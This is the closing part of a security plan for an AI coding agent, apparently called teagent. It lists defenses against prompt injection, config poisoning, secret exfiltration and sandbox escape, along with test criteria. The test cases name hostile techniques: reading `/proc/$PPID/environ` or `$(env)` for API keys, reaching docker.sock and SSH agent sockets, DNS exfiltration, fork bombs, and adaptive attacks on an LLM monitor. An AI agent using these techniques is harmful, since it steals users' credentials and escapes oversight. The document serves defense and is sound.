| Approval load, from the journal | The 93% problem in teagent's own UX | Prompts per session, approve rate, diff lines per approval, high-risk sections per diff |
| Replay determinism | That the ABI and image contract holds | 100% of `test/sessions/*.jsonl` replay exactly on every build of an ABI version |

## Adoption plan, in order

The order follows three rules:

- First, close gaps confirmed in the code that cost hours or days and match a real CVE class (P0).
- Then build the data-flow half that the architecture already makes cheap (P1).
- Then handle the ecosystem, audit and UX (P2), and finally the research bets where teagent can lead (P3).

Changes to classes or to the JSON of values need ABI version 2 under `abi.md`'s own rule. They are grouped so that one version bump covers P0.4, P1.2 and P2.4.

| # | Mechanism | Touches | Defends against | Cost | Done when |
| --- | --- | --- | --- | --- | --- |
| P0.1 (done 2026-11-11, without the profile `env` list: extra variables need a command-line grant, which changes the image and waits for ABI v2) | Scrub the shell environment: pass an allowlist (`PATH`, `HOME`, `LANG`, `TERM`, toolchain variables, plus a profile `env` list) instead of `Unix.environment ()`. Add `--clearenv` to bwrap. Set `npm_config_ignore_scripts=true` by default | sandbox (`lib/tools` shell launch), OS/profile | `$(env)` and `/proc/$PPID/environ` theft (Gemini CLI, CVE-2026-12537), API-key exfiltration through granted hosts, postinstall malware (Nx, Shai-Hulud, Clinejection) | Hours | With `ANTHROPIC_API_KEY` and `GITHUB_TOKEN` set in the parent, `env` in a contained shell shows neither on macOS and Linux, and an escape-demo case asserts it |
| P0.2 (done 2026-11-11; DNS turned out to be closed already under `(deny network*)`, while the clipboard, the keychain and Apple events were open) | Deny-by-default Seatbelt profile: `(deny default)` with an empirically built allow set for toolchains. Deny Mach lookups except a short list (no `com.apple.dnssd.service`, so names resolve only through the proxy), process-info on other processes, unix-socket connects, and `launchctl` | sandbox | Pillar failure modes 1 and 2 (allow-default profile, Docker socket), SSH and gpg agent sockets, DNS exfiltration (CVE-2025-55284 class), reading other processes' arguments and environment | 2–4 days, mostly finding what `dune`, `opam`, `npm`, `cargo` and `xcrun` need | Escape suite v2 cases for docker.sock, `$SSH_AUTH_SOCK`, `launchctl`, `ps eww $PPID` and a canary-DNS lookup all fail, and `bench/` builds still pass |
| P0.3 (done 2026-11-11 in ABI 2: tooling folders denied at any depth; host-run files shown apart and allowed only through the person, never by default, `--dry-run` or MCP) | One versioned **host-executed path set**: files other programs run or obey (git, IDEs, shells, package managers, CI, other agents). Match it at any depth, case-folded, after realpath. A write there is either `Denied` or held for a separate, explicit approval that `--yes` and MCP never grant | `Tools` path parsing, approval (`Driver`), OS | Config-as-code (CVE-2025-53773, CurXecute, CVE-2026-48124, Pillar 3, 4 and 7), cross-pass `AGENTS.md` poisoning, CI-workflow and hook persistence | 1–2 days | Writes to `pkg/.git/hooks/pre-commit`, `.github/workflows/x.yml`, `AGENTS.md`, `.husky/*`, `.pre-commit-config.yaml` and a new `scripts.postinstall` each get `Denied` or a separate prompt, and `--yes` declines them |
| P0.4 (done 2026-11-11 in ABI 2, the class and the full `Fetch.post` body; there is no planning speculation yet for it to stop) | Reclassify egress. Add an `Egress` class for `Fetch.get` and for `shell` when `--net` hosts are granted. Planning does not speculate through it, the journal records host and path, and P1.1 counts it. Show the full `Fetch.post` body (page it, never cut it) | call classes (`Value.class_`, `Device.class_of`), plan, ABI v2 | Exfiltration through allowed channels (Hugging Face counters in CVE-2026-54316, Cowork's API-key upload), requests sent during planning | 1–2 days plus the ABI bump | A local canary server sees no request during planning; a networked `shell` and a non-constant `Fetch.get` appear in the plan summary; an `abi2` fixture replays |
| P0.5 (done 2026-11-11: `.env*` hidden, wider home list, redaction by token shape at the model boundary; values of environment variables are not matched, because that would make what the model saw depend on the machine and break replay; the journal keeps raw values, 0600) | Secret hygiene: hide `.env*` by default, widen the home deny list (`.config/gcloud`, `.azure`, `.cargo/credentials`, browser profiles), and redact secret-shaped values and known environment values before results enter model context or the journal | OS default mounts, `journal` layer, handler results | LLM02 and ATLAS T0083; the journal as a plaintext secret store | 2–3 days | A session that reads a fake AWS key logs `[SECRET_1]`, the model never sees the raw value, and replay still matches |
| P1.1 (done 2026-11-11: `Lang.calls` over the compiled IR, `Os.exposure`, one question per program or hole fill, logged as `exposed`; `--net` counts as no consent, so networked shell needs `--ask`) | Plan-time effect summary and **trifecta check** over `Ir.Ast`: collect the reachable `Platform` nodes and `Agent.call` names with their classes. If private reads, untrusted input and `Egress`/`Irreversible` are all reachable, ask once up front with the summary, or refuse with a `Reporting.Report` | typechecker/plan (`Lang`), OS | ASI01 and ATLAS M0030 at plan time; approval fatigue (one prompt per program, not per call) | ~1 week | A program reaching `read` plus `Fetch.post` is held before any effect with a report naming the three legs; a program reaching only `read` and `edit` runs unprompted |
| P1.2 (done 2026-11-11: `Value.source` labels, `V_labelled` values and `Labelled` tasks, propagated by `Interp` and `Handler.interpret` with STRICT branches; the `policy` layer asks before `Egress` carrying project content; labels are recomputed on replay, so the log and the ABI did not change; P1.1 now counts drivers as outward only with holes) | **Provenance labels on interpreter values** (CaMeL and FIDES): the handler stamps `Workspace path`, `Net host`, `Shell`, `User`, `Model`; `interp` propagates them through every primitive, with STRICT mode for `case` on labelled values. The `policy` layer checks labels at `Egress` and `Irreversible` arguments; the question shows the flow | interpreter values, handler, `policy` layer, ABI v2 (labels in the JSON of values) | Toxic flows; data reaching the network from files; `merge` and MCP boundaries (Multi-CaMeL) | 2–3 weeks | A URL built from file content and sent to a granted host is held with its provenance shown; a constant URL passes; replay is identical; labels are pure metadata, so `interp` still does no IO |
| P1.3 (done 2026-11-11, widened by choice: every program and hole fill runs labelled with the sources of all calls the session performed before it, which closes the conversation channel too; contents stay visible at holes) | **Holes as a flow boundary.** When in-scope values carry untrusted labels, show their types, labels and lengths instead of contents (or route the contents through P3.2). Typecheck the fill against an `Agent` module cut of `Egress` and `Irreversible`, and taint everything the fill builds | holes (`Run.question`, `Run.filled`), typechecker | Re-planning after seeing injected data, the one place teagent's control-flow integrity breaks | ~1 week after P1.2 | With an injected README string in scope, no fill can reach `Fetch.post` or a networked `shell` without consent, shown by a test |
| P1.4 | `policy` as a Dartea module the person writes: pure, total rules `Call -> Labels -> History -> Decision` with `Decision = Allow \| Ask String \| Deny String`, history-aware. A repo-supplied rule can only add `Ask`/`Deny` | `policy` boot layer, OS, typechecker | Sequence violations single-call rules miss (the VIGIL gap); "code freeze" made real | 1–2 weeks | "No `Fetch.post` after reading `secrets/**`" denies at run time, the denial is journaled, and replay reproduces it |
| P1.5 (done 2026-11-11 in part: every command runs in its own process group under a wall-clock limit (`seconds`, 1800 by default), CPU time, 4 GiB files and the user's process count plus 1024; the `policy` layer stops asking after 3 refusals in a row or 20 in all. Not done: per-class caps, tokens, memory limits (macOS does not enforce RLIMIT_AS). The fork bomb and 10 GB write are not run in tests; the tests check the limits are set and that a timeout kills) | `budget` grows per-class caps, tokens, wall-clock and a **denial circuit breaker** (stop after 3 consecutive or 20 total denials, return the remainder as data). Add rlimits on shell CPU, memory, processes and file size | `budget` layer, sandbox | LLM10, guardrail DoS, retry loops | 2–3 days | Three straight denials end the program with the rest of the task returned; a fork bomb and a 10 GB write die at their limits |
| P2.1 | **Risk-ranked diff approval**: host-executed paths, `.teagent`, CI, manifests and lockfiles (new dependencies flagged), tests (skip/xfail, exit-code and timer patches flagged), then the rest, each with its own y/N. Ship a profile preset with `readonly "test"` | approval (`Driver`), journal | ASI09 rubber-stamping; reward hacking (ImpossibleBench); slopsquatting (19.7% of recommended packages did not exist ([CSA](https://labs.cloudsecurityalliance.org/research/csa-research-note-slopsquatting-ai-supply-chain-20260419/)) *(secondary)*) | ~1 week | A diff touching `package.json` and `test/` shows those first with separate prompts; the journal records each answer |
| P2.2 | **Skill trust gate**: repo skills install only after the person trusts their hash (stored in `~/.teagent`, outside the repo); any change asks again. Reject invisible and bidi Unicode in skills, drivers and any file teagent injects into prompts. Show each skill's provenance (repo or user) | skills (`Lang.Calls` install), OS | ClawHavoc, before-trust execution (CVE-2025-59536 class), Rules File Backdoor, GlassWorm, ATLAS T0109 rug pull | 2–3 days | In a fresh clone, a new skill is not shown to the model until approved; a one-byte change asks again; a skill containing U+202E fails to install with a report |
| P2.3 | MCP server: honest annotations (`read`/`grep` readOnly; `write`/`edit` non-destructive while staged; `bash` destructive and openWorld when `--net` is granted). Optionally split `run` into run-then-`apply`, so the caller's permission prompt shows the diff. Keep stdio only and never implement sampling | MCP server | ASI07; a hijacked caller committing silently; toxic flows through teagent's outputs | 2–3 days | Claude Code and Codex prompt for `bash` and `apply` but not for `read`; `run` returns a diff and commits nothing until `apply` |
| P2.4 | Journal hash chain (previous hash in each event), model input/output hashes, allowed-egress events, and a signed session root on apply | journal, ABI v2 | OWASP T8 repudiation; trace tampering; forensics | 2–3 days | Editing one line of a log makes `--replay` refuse and name the broken link |
| P2.5 | **Counterfactual replay**: `--replay --policy FILE` re-evaluates the policy at its place while answering effects from the log | journal and boot order | Policy regressions; "would this rule have stopped that incident?" | 2 days after P1.4 | An injection fixture in `test/sessions` is denied at the expected event under the new rule in `dune test` |
| P2.6 | Credential-holding drivers take secrets by name from a host store and inject them in the handler; they never exist as program values. Tokens are per driver and audience-bound | drivers | ASI03 and T0083; the Cloudflare "bindings hold credentials" and Cowork "scoped token" lessons | ~1 week | An authenticated `Fetch.post` runs with no `String` containing the token in interpreter values or the journal |
| P2.7 | Project hygiene: SECURITY.md, an SBOM (opam lock plus vendored Dartea), Sigstore-signed releases, pinned CI, no AI workflows on untrusted issues | release process | CRA-style expectations; the Clinejection and Amazon Q release-pipeline compromises | 1–2 days | A release carries a Sigstore bundle and SBOM; SECURITY.md names a contact |
| P2.8 | If teagent ever consumes third-party MCP servers: each one becomes a driver pinned by package digest and canonical `tools/list` hash in the image, classed by the OS rather than its annotations, run under the `Contained` sandbox, with no sampling | skills/drivers, image, sandbox | Tool poisoning, rug pulls (postmark-mcp), shadowing | 1–2 weeks | A server that changes one tool description between runs is refused until re-approved |
| P3.1 | **Static labels in the `Agent` module**: results from external sources typed `Tainted a` (opaque); `Egress` and `Irreversible` arguments accept only clean values; the only ways out are `Agent.consent` or parsing into a closed variant. FlowCaml-style flow control through an opaque type, with no change to Dartea's type system | typechecker/`Agent` module (lib/agent/Agent.elm) | Data-flow attacks rejected at compile time; no published precedent for an agent DSL | Weeks; utility risk | Passing `read` output to a `Fetch.post` body fails to compile with a hint naming `consent`; utility is measured on the injection suite |
| P3.2 | Quarantined-LLM kernel `Agent.extract : Decoder a -> String -> Task e a`, which returns only closed types (enums, bounded `Int`) and has no tools; it is the endorsement path for P3.1 | `Agent` module, own LLM client | The Dual LLM and Map-Reduce patterns; reading untrusted docs safely | 1–2 weeks | Classifying an injected issue into `Bug \| Feature \| Spam` cannot produce any other value, and its output is low-label |
| P3.3 | Ahead-of-time temporal checking (LTLf or CTL) of the program's `Task` graph, with the counterexample returned as a compile report (as in CaMeLoT); an online residual monitor handles data-dependent branches and holes, and its state is journaled | plan/typechecker, `policy` | History-dependent policies before any effect; no published ahead-of-time version exists | Weeks to months | "No `Egress` after reading `secrets/**`" rejects a violating program before it runs and names the path through the program |
| P3.4 | Optional plan-time monitor layer: an LLM judges the task plus the program text, reasoning-blind; it may only `Ask` or `Deny`, resamples are capped, and it is evaluated with monitor-aware adaptive attacks | new boot layer | Overeager or destructive plans the classes miss | ~1 week plus evaluation | Adaptive evaluation on the injection suite shows a gain without any `Allow` path |
| P3.5 | `Irreversible` requires a `Consent` or `Compensation` value in its type (Atomix); `spawn` takes explicit capability values (Shill-style) | call classes, `Agent` module, processes | Externalized effects without an undo story; children naming rights they were not given | Weeks | A program cannot typecheck an `Irreversible` call without one of the two values |

The P0 items close the specific gaps found in the code read. Their cost is small, and the CVE record shows that each class has been exploited in the field. P1.1 and P1.2 are the substantive work. P1.1 is cheap because the program is a typed value. P1.2 is the CaMeL interpreter that teagent already has the shape for; without it, FIDES's result says that every planner, however clean its control flow, is vulnerable through data. P1.3 should follow immediately, because holes are the one place teagent's "program fixed before data" property does not hold.

## Claims in this report that rest on weaker sources

Several load-bearing claims come from secondary sources and should be checked before anyone quotes them:

- the MITRE ATLAS v2026.09 counts and technique IDs (Speakeasy);
- the OWASP ASI per-item definitions (promptfoo and Teleport mirrors);
- the Opus 4.8 and Opus 5 system-card injection figures (press);
- the SOCKS5 NUL-byte Claude Code bypass (SecurityWeek and a blog);
- ISO/IEC 27090's publication date (Nemko and AFNOR, while ISO's page still showed "under publication");
- the Codex sandbox and approval-mode details (third-party mirrors, not OpenAI docs);
- the slopsquatting figures (CSA and Socket);
- CVE-2026-55607, CVE-2026-25725 and CVE-2026-26268 (advisory mirrors only).

These rest on the researchers' prior knowledge, with primary URLs that were not re-opened:

- the Rules File Backdoor;
- the Invariant GitHub MCP toxic flow;
- the Ctrl-Z 58%→7% result;
- the AgentDojo, InjecAgent and ASB dataset sizes;
- AgentSpec, IsolateGPT and Conseca details;
- Copilot's agent firewall.

Two conflicts were left unresolved:

- Progent's AgentDojo numbers differ between paper versions and summaries.
- CaMeL's utility is 77% on AgentDojo by the authors but 31% in Agent-Sentry's comparison on a different benchmark ([arXiv 2603.22868](https://arxiv.org/pdf/2603.22868)).

## Conclusion

The field's hardest-won lesson suits teagent. Prompt injection will not be solved in the model, so security has to come from what the runtime lets a program do. teagent already makes the program the unit of consent: typed, cut to the OS, fixed before any data arrives, and replayable. That moves its risk away from "the model was tricked mid-run", where tool-call agents keep losing, to two narrower places. One is **misclassification**: a networked `shell` counted as `Contained`, a `Fetch.get` counted as `Pure`, an allow-default profile counted as a sandbox. The other is the **handoff at commit**, where an approved file meets an unsandboxed host tool. Both are small, enumerable and testable, which is why the P0 list is short.

The larger opportunity is that teagent holds the whole program before the first effect, and no published system does. The trifecta check, static `Tainted` types and ahead-of-time temporal checking are each described in the literature only as online monitors or dynamic tags. In teagent they become compile errors, reported through the same channel the model already learns from. If teagent publishes per-task, adaptive, k-attempt numbers on a coding injection suite with these in place, it would be the first harness-level result of its kind, not just another model score.
